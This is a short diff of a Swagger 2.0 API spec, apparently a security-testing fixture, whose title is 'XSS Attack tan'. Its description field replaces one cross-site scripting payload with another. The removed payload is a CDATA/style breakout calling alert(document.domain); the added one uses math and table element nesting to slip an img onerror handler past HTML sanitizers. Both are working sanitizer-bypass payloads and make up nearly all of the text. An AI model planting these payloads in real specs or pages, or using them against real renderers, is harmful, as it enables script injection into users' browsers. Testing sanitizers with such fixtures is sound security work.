@@ -2,7 +2,13 @@ swagger: "2.0"
 info:
   title: XSS Attack tan
   description: |
-    <style><![CDATA[</style><div data-x="]]></style><img src=x onerror=alert(document.domain)><style><!--"></div><style>--></style></div>
+    <math><foo-test><mi><li><table><foo-test><li></li></foo-test><a>
+      <style>
+        <! \${
+      </style>
+      }
+      <foo-b id="><img src onerror='alert(1)'>">hmm...</foo-b>
+    </a></table></li></mi></foo-test></math>
 
   version: production
 basePath: /JSSResource/
